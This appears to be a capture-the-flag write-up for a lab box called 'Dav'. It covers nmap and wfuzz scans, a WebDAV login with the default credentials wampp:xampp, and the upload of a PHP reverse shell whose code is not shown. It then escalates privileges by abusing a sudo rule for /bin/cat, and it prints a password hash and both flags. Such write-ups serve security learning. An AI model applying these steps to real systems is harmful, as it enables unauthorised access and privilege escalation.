> Dav | export IP=10.10.171.88

# Nmap

nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```

# Wfuzz

wfuzz -u http://$IP/FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/fuzz-Bo0oM.txt --hc 404

```
00004131:   401        14 L     54 W     459 Ch      "webdav/"                                           
000004132:   401        14 L     54 W     459 Ch      "webdav/index.html"                                 
000004133:   401        14 L     54 W     459 Ch      "webdav/servlet/webdav/"
```

cadaver http://$IP/webdav/

**Note: Using default credentials `wampp`:`xampp`***

`passwd.dav`
==============================
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
==============================

Uploading our php reverse shell in dav using command `put php-reverse-shell.php` and `cat php-reverse-shell.php` gives us our shell!!

**user.txt**
===============================
449b40fe93f78a938523b7e4dcd66d2a
===============================

# Privilege Escalation

sudo -l 

```
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
# Exploit
```
LFILE=/root/root.txt
sudo cat $LFILE
```

**root.txt**
===============================
101101ddc16b0cdf65ba0b8a7af7afa5
===============================
